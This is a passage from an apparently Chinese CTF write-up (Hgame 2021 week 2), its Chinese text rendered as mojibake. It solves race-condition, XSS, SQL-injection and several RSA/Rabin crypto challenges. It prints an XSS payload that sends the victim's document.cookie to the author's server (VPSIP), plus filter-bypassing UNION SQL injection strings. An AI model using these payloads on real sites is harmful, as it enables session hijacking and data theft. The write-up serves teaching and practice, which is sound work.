<strong>ï¼ˆæ•°æ®åº“ï¼‰æ¡ä»¶ç«äº‰</strong>ã€‚ä¹Ÿå°±æ˜¯<strong>é€šè¿‡å¤§é‡å¹¶å‘è®©æœåŠ¡å™¨æªæ‰‹ä¸åŠ</strong>ã€‚</p><p>åˆ©ç”¨å¤šçº¿ç¨‹å¹¶å‘å»æ‰§è¡ŒåŒä¸€ä¸ª buy æ“ä½œï¼Œä»¥è‡³äºæœåŠ¡å™¨å¤„ç†çš„çº¿ç¨‹ä¹‹é—´æœªèƒ½åŒæ­¥å¥½æ‰€æœ‰è¯·æ±‚ï¼Œæ‰£é™¤ä½™é¢å’Œå‘æ”¾å…‘æ¢åˆ¸ä¸èƒ½åŒæ—¶å®Œæˆï¼Œä»è€Œå°±èƒ½è¶…è¿‡52å¼ å…‘æ¢åˆ¸äº†ã€‚</p><p>è¿™é‡Œç”¨ BurpSuite çš„ Intruder æ¥å®ç°ã€‚</p><p>å…ˆæŠ“ä¸ªåŒ…ï¼Œæ¯æ¬¡å…‘æ¢ 5ä¸ªå…‘æ¢åˆ¸ã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207235047408.png" alt="å…‘æ¢"></p><p>é€‰æ‹© Null payloadsï¼Œç”Ÿæˆ 100 ä¸ª payloadsï¼Œç„¶åå†å¼€ 10 ä¸ªçº¿ç¨‹å¹¶å‘æ‰§è¡Œã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207235159952.png"></p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207235234497.png"></p><p>ç¬é—´å°±è·‘å®Œäº†ï¼Œç„¶ååˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼Œå…‘æ¢ï¼Œæ‹¿åˆ° flagã€‚</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207233653226.png" alt="æ‹¿åˆ°flag"></p><p><code>hgame{L0ck_1s_TH3_S0lllut!on!!!}</code></p><p>æ‰€ä»¥è¦åŠ é”å‘¢ã€‚</p><blockquote><p>BTW, æœ¬æ¥ç”¨ Python å¤šçº¿ç¨‹è·‘çš„ï¼Œå‘ç°ä¸è¡Œâ€¦â€¦ä¼°è®¡å¼€çš„ä¸å¤Ÿå¤šï¼Ÿ</p><p><strong><em>Extensive reading:</em></strong> </p><p><a href="https://shuaizhupeiqi.github.io/2018/11/15/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/">CTFä¸­çš„æ¡ä»¶ç«äº‰æ¼æ´</a></p><p>ä¾‹1ï¼šé‡‘é¢æç°</p><p>ä¾‹2ï¼šå…ˆå­˜å‚¨æ–‡ä»¶ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œç„¶åå†åˆ é™¤ã€‚===&gt; å†™å…¥ shell æœ¨é©¬</p><p>ä¼ªä»£ç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">saveimg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//å¾—åˆ°ä¿å­˜è·¯å¾„filename</span>    <span class="token comment">//æ£€æŸ¥æ–‡ä»¶</span>    <span class="token function">check</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ä¸ç¬¦åˆè§„èŒƒ<span class="token punctuation">)</span>        <span class="token function">delete</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        pass<span class="token punctuation">;</span>    <span class="token comment">//...</span> <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span></code></pre></blockquote><h3 id="Post-to-zuckonit"><a href="#Post-to-zuckonit" class="headerlink" title="Post to zuckonit"></a>Post to zuckonit</h3><blockquote><p>d1gg12 æ–°å­¦äº†HTMLï¼Œä¸€èµ·æ¥çœ‹çœ‹ä»–å†™çš„åœ¨çº¿åšå®¢å§ï¼</p><p><a href="http://zuckonit.0727.site:7654/">http://zuckonit.0727.site:7654</a> </p></blockquote><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210210014353832.png"></p><p><strong>XSS</strong></p><p><code>script.js</code> é‡Œæœ‰ API</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/code"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#captcha'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>placeholder <span class="token operator">=</span> <span class="token string">"Code: md5(code)[:6] == "</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>code<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#send"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> contentInput <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>contentInput <span class="token operator">!==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                type<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>                url<span class="token operator">:</span> <span class="token string">'/send'</span><span class="token punctuation">,</span>                data<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string">"content"</span><span class="token operator">:</span> contentInput<span class="token punctuation">}</span>                <span class="token punctuation">,</span>                <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token punctuation">,</span>                <span class="token function-variable function">error</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#clear"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/clear"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#output'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> code <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#captcha'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/submit"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'code'</span><span class="token operator">:</span> code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">alert</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>äºæ˜¯å°±æ„é€  XSS è¯·æ±‚ï¼Œå¯ä»¥å‘ç°ä»–è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œæ¯”å¦‚ script, http, httpsï¼Œè€Œä¸”ç”¨ img çš„æ—¶å€™è¿”å›çš„å­—ç¬¦å€’åºäº†ã€‚</p><p>é‚£å’±å°±å€’è¿‡æ¥å†™å§ã€‚</p><p>æœ€å¼€å§‹æ˜¯ç”¨ img æ‰“åˆ° <a href="https://xss.pt/">https://xss.pt</a> ä¸Šé¢çš„ï¼Œåæ¥æœ‰é—®é¢˜æ€»æ˜¯æ¥æ”¶ä¸åˆ°ã€‚</p><p>ç±»ä¼¼äºè¿™æ ·</p><pre class="language-none"><code class="language-none">&gt;gpj.pW3uo/tp.ssx//'=crs/gmi&lt;img/src='//xss.pt/ou3Wp.jpg</code></pre><p>å¹²è„†ç›´æ¥æ‰“åˆ°è‡ªå·± VPS ä¸Šï¼Œç”¨ url ç®—äº†ã€‚</p><p>æ³¨æ„ submit çš„æ—¶å€™éœ€è¦æ ¡éªŒ md5ï¼Œå†™ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0xFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token string">'612bbe'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><strong>Payload:</strong></p><pre class="language-none"><code class="language-none">"eikooc.tnemucod+'/å€’è¿‡æ¥çš„VPSIP//'=ferh.onitacol.wodniw"=rorreno/'#'=crs/gmi&lt;&lt;img/src='#'/onerror="window.location.href='//VPSIP/'+document.cookie"</code></pre><p>VPS ä¸Šæ‹¿åˆ° cookie </p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210210012728845.png"></p><p>ç„¶åå¸¦ç€è¿™ä¸ª cookie è®¿é—® <code>/flag</code>ï¼Œæ‹¿åˆ° flag</p><p><code>hgame{X5s_t0_GEt_@dm1n's_cOokies.}</code></p><h3 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h3><blockquote><p><strong>hint: status å­—æ®µä¼šæœ‰ä»€ä¹ˆåå¿ƒæ€å‘¢?</strong><br><strong>hint: è¿™äº›å­—ç¬¦ä¸²å­˜åœ¨å“ªé‡Œå‘¢ï¼Ÿå˜é‡ï¼Ÿè¿˜æ˜¯â€¦ï¼Ÿ</strong><br>ä»Šå¤©ä½  PTSD äº†å—ï¼Ÿ</p><p><a href="https://200ok.liki.link/">https://200ok.liki.link</a> </p></blockquote><p>Header Status å­—æ®µ SQL æ³¨å…¥ã€‚</p><p>è¿‡æ»¤äº†ä¸€äº›å…³é”®è¯ï¼Œå¤§å°å†™æ··ç”¨æ¥ç»•è¿‡ï¼Œç©ºæ ¼ç”¨ <code>/**/</code> ç»•è¿‡ã€‚</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># GET https://200ok.liki.link/server.php</span><span class="token comment"># æŸ¥è¯¢å½“å‰æ•°æ®åº“</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/uNion/**/SelecT/**/database()#week2sqli# æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“-1'</span><span class="token comment">/**/</span><span class="token keyword">uNion</span><span class="token comment">/**/</span><span class="token keyword">SelecT</span><span class="token comment">/**/</span>group_concAt<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">fRom</span><span class="token comment">/**/</span>information_schema<span class="token punctuation">.</span>schemata<span class="token comment">#</span>information_schema<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>sys<span class="token punctuation">,</span>week2sqli<span class="token comment"># æŸ¥è¯¢è¡¨å</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/uNion/**/SelecT/**/group_concAt(table_name)/**/frOm/**/information_schema.tables/**/wherE/**/table_schema=database()#f1111111144444444444g,status# æŸ¥è¯¢åˆ—å-1'</span><span class="token comment">/**/</span><span class="token keyword">uNion</span><span class="token comment">/**/</span><span class="token keyword">SelecT</span><span class="token comment">/**/</span>group_concAt<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">frOm</span><span class="token comment">/**/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">/**/</span><span class="token keyword">wherE</span><span class="token comment">/**/</span>table_name<span class="token operator">=</span><span class="token string">'f1111111144444444444g'</span><span class="token comment">#</span>ffffff14gggggg<span class="token comment"># æŸ¥è¯¢å­—æ®µå€¼</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment">/**/</span><span class="token keyword">uNion</span><span class="token comment">/**/</span><span class="token keyword">SelecT</span><span class="token comment">/**/</span>ffffff14gggggg<span class="token comment">/**/</span><span class="token keyword">frOm</span><span class="token comment">/**/</span>f1111111144444444444g<span class="token comment">#</span>hgame{Con9raTu1ati0n5<span class="token operator">+</span>yoU_FXXK<span class="token operator">~</span>Up<span class="token operator">-</span>tH3<span class="token punctuation">,</span><span class="token number">5</span>Q1<span class="token operator">!</span><span class="token operator">!=</span><span class="token punctuation">)</span>}</code></pre><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><strong>task:</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number<span class="token keyword">from</span> secret <span class="token keyword">import</span> FLAGm <span class="token operator">=</span> s2n<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>a <span class="token operator">=</span> number<span class="token punctuation">.</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>p <span class="token operator">=</span> number<span class="token punctuation">.</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>c <span class="token operator">=</span> a <span class="token operator">**</span> p <span class="token operator">*</span> m <span class="token operator">%</span> p<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a = {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p = {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c = {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># a = 164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543</span><span class="token comment"># p = 119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383</span><span class="token comment"># c = 61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732</span></code></pre><blockquote><p>(a + b) % n â‰¡ (a % n + b % n) % n<br>(a - b) % n â‰¡ (a % n - b % n) % n<br>(a * b) % n â‰¡ (a % n * b % n) % n<br>(a ^ b) % n â‰¡ ((a % n) ^ b) % n //å¹‚è¿ç®—</p><p>è‹¥ a â‰¡ b (mod n)ï¼Œåˆ™</p><ol><li>å¯¹äºä»»æ„æ­£æ•´æ•°cï¼Œæœ‰ a^c â‰¡ b^c (mod n)</li><li>å¯¹äºä»»æ„æ•´æ•°cï¼Œæœ‰ ac â‰¡ bc (mod n), a+c â‰¡ b+c (mod n),</li><li>è‹¥ c â‰¡ d(mod n)ï¼Œåˆ™ a-c â‰¡ b-d(mod n), a+c â‰¡ b+d(mod n), ac â‰¡ bd(mod n)</li></ol><p>å¦‚æœ acâ‰¡bc (mod m)ï¼Œä¸”cå’Œmäº’è´¨ï¼Œåˆ™ aâ‰¡b (mod mï¼‰ã€‚<br>[ç†è§£ï¼šå½“ä¸”ä»…å½“cå’Œmäº’è´¨ï¼Œc^-1å­˜åœ¨ï¼Œç­‰å¼å·¦å³å¯åŒä¹˜æ¨¡é€†ã€‚]</p><p><strong>é™¤æ³•è§„åˆ™ï¼š</strong><br>åœ¨æ¨¡næ„ä¹‰ä¸‹ï¼Œa/bä¸å†ä»…ä»…ä»£è¡¨è¿™ä¸¤ä¸ªæ•°ç›¸é™¤ï¼Œè€Œæ˜¯æŒ‡ a + k1 * n å’Œ b + k2 * n è¿™ä¸¤ä¸ªç»„æ•°ä¸­ä»»æ„ä¸¤ä¸ªç›¸é™¤ï¼Œä½¿å•†ä¸ºæ•´æ•°<br>å› æ­¤ä¹Ÿå°±å¯ä»¥ç†è§£ï¼Œé™¤ä»¥ä¸€ä¸ªæ•°ç­‰ä»·äºä¹˜ä»¥å®ƒçš„é€†<br>a/b â‰¡ c(mod n) &lt;=&gt; a â‰¡ c * (b^-1) (mod n)ï¼Œå…¶ä¸­bæ¨¡nçš„é€†è®°ä½œbçš„è´Ÿä¸€æ¬¡æ–¹ã€‚</p><p><strong>è´¹é©¬å°å®šç†ï¼š</strong><br>aæ˜¯æ•´æ•°ï¼Œpæ˜¯è´¨æ•°ï¼Œåˆ™ a^p==a (mod p)ï¼Œå¦‚æœ a ä¸æ˜¯ p çš„å€æ•°ï¼Œè¿˜æœ‰ a^(p-1) â‰¡ 1 (mod p) </p><p><strong>See Also:</strong>  <a href="https://blog.sengxian.com/algorithms/mod-world">æ¨¡è¿ç®—æ€»ç»“</a> å’Œ <a href="https://github.com/wujr5/algorithm-analysis-and-design/blob/master/relative-algorithm-learning/6-algorithm-about-modulo-operation.md">å–æ¨¡è¿ç®—æ¶‰åŠçš„ç®—æ³•</a></p></blockquote><p>åœ¨è¿™é¢˜é‡Œé¢ï¼Œå°±å¯ä»¥åŒ–ç®€ä¸€ä¸‹ã€‚</p><p>$$<br>c = a ^ p \cdot m \bmod p \\<br>\ = a \cdot m \bmod p \\<br>\Rightarrow<br>m = c \cdot a^{-1} \bmod p<br>$$</p><p><strong>Exp:</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2a <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543</span><span class="token punctuation">)</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383</span><span class="token punctuation">)</span>c <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732</span><span class="token punctuation">)</span>x <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span> p<span class="token punctuation">)</span>m <span class="token operator">=</span> c <span class="token operator">*</span> x <span class="token operator">%</span> p<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 3741406882261031073760817995303276732942491822855369918885665586853805791130867897899676088764261025784189</span><span class="token comment"># b'hgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}'</span></code></pre><h3 id="WhitegiveRSA"><a href="#WhitegiveRSA" class="headerlink" title="WhitegiveRSA"></a>WhitegiveRSA</h3><blockquote><p>N = 882564595536224140639625987659416029426239230804614613279163<br> e = 65537<br> c = 747831491353896780365654517748216624798517769637260742155527</p></blockquote><p>p, q = 857504083339712752489993810777, 1029224947942998075080348647219</p><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210206201058382.png"></p><p><code>hgame{w0w~yOU_kNoW+R5@!}</code></p><blockquote><p><strong>Extensive reading:</strong></p><p><a href="https://xz.aliyun.com/t/2446">CTFä¸­å¸¸è§çš„RSAç›¸å…³é—®é¢˜æ€»ç»“</a></p></blockquote><h3 id="gcd-or-more"><a href="#gcd-or-more" class="headerlink" title="gcd or more?"></a>gcd or more?</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> FLAGp <span class="token operator">=</span> <span class="token number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span>q <span class="token operator">=</span> <span class="token number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qcipher <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>s2n<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token comment"># 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></code></pre><p>å‚è€ƒ <a href="https://xz.aliyun.com/t/5113">RabinåŠ å¯†ç®—æ³•å’Œnæ¬¡åŒä½™æ–¹ç¨‹</a>ã€<a href="https://en.wikipedia.org/wiki/Rabin_cryptosystem">Rabin cryptosystem</a></p><p>æ­£å¥½ç¬¦åˆåŠ å¯†çš„é€»è¾‘</p><blockquote><p>é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°på’Œqåšä¸ºç§é’¥</p><p>è®¡ç®—n = p * qåšä¸ºå…¬é’¥</p><p>è‹¥æ˜æ–‡ä¸ºmï¼Œåˆ™å¯†æ–‡ä¸ºc â‰¡ m^2 (mod n)</p></blockquote><p>è§£å¯†ï¼š</p><blockquote><ol><li>Compute the square root of $c$ modulo $p$ and $q$ using these formulas:</li></ol><p>$$<br>{\displaystyle {\begin{aligned}<br>m_{p}=c^{\frac {1}{4}(p+1)}{\bmod {p}} \\<br>m_{q}=c^{\frac {1}{4}(q+1)}{\bmod {q}}<br>\end{aligned}}}<br>$$</p><ol start="2"><li>Use the <a href="https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm">extended Euclidean algorithm</a> to find $y_{p}$ and $y_{q}$ such that  $$ y_{p}\cdot p+y_{q}\cdot q=1 $$</li><li>Use the <a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">Chinese remainder theorem</a> to find the four square roots of  $c$ modulo $n$:</li></ol><p>$$<br>r_{1}=\left(y_{p}\cdot p\cdot m_{q}+y_{q}\cdot q\cdot m_{p}\right){\bmod {n}} \\<br>r_{2}=n-r_{1} \\<br>r_{3}=\left(y_{p}\cdot p\cdot m_{q}-y_{q}\cdot q\cdot m_{p}\right){\bmod {n}} \\<br>r_{4}=n-r_{3}<br>$$</p><p>One of these four values is the original plaintext $m$.</p><p>å››ä¸ªè§£ä¸­æœ‰ä¸€ä¸ªå°±æ˜¯å¯†æ–‡ mã€‚</p></blockquote><p>æ³¨æ„åˆ°è¿™é‡Œçš„ p, q % 4 == 3.</p><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">power</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> k1<span class="token punctuation">,</span> k2<span class="token punctuation">,</span> w<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s1<span class="token operator">*</span>k1<span class="token operator">+</span>s2<span class="token operator">*</span>k2<span class="token operator">*</span>w<span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">,</span> <span class="token punctuation">(</span>s1<span class="token operator">*</span>k2<span class="token operator">+</span>s2<span class="token operator">*</span>k1<span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Cipolla_algorithm</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>    w <span class="token operator">=</span> a <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> n    <span class="token keyword">while</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">!=</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>        w <span class="token operator">=</span> a <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> n    times <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    k1 <span class="token operator">=</span> <span class="token number">1</span>    k2 <span class="token operator">=</span> <span class="token number">0</span>    first <span class="token operator">=</span> <span class="token 